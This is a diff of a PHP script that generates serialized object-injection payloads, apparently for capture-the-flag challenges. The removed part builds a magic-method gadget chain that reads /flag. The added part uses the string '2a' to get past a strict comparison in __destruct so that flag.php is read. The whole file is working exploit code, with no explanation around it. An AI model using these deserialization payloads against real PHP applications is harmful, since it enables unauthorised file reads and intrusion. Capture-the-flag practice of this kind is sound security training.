@@ -1,58 +1,44 @@
 <?php
-class Start{
-    public $name;
-    public $func;
-
-    public function __destruct()
-    {
-        echo "Welcome to NewStarCTF, ".$this->name;
+class FileHandler {
+    public $op;
+    public $filename;
+    public $content;
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
     }
-
-    public function __isset($var)
-    {
-        ($this->func)();
-    }
-}
-class Sec{
-    public $obj;
-    public $var;
-    public function __toString()
-    {
-        $this->obj->check($this->var);
-        return "CTFers";
-    }
-
-    public function __invoke()
-    {
-        echo file_get_contents('/flag');
-    }
-}
-class Easy{
-    public $cla;
-
-    public function __call($fun, $var)
-    {
-        $this->cla = clone $var[0];
-    }
-}
-class eeee{
-    public $obj;
-
-    public function __clone()
-    {
-        if(isset($this->obj->cmd)){
-            echo "success";
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
         }
     }
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
 }
-$a=new Start();
-$b=new Sec();
-$c=new Easy();
-$d=new eeee();
-$a->func=$b;
-$d->obj=$a;
-$b->obj=$c;
-$b->var=$d;
-$a->name=$b;
+$a=new FileHandler();
+$a->op="2a";
+$a->filename="flag.php";
 echo serialize($a);
 ?>
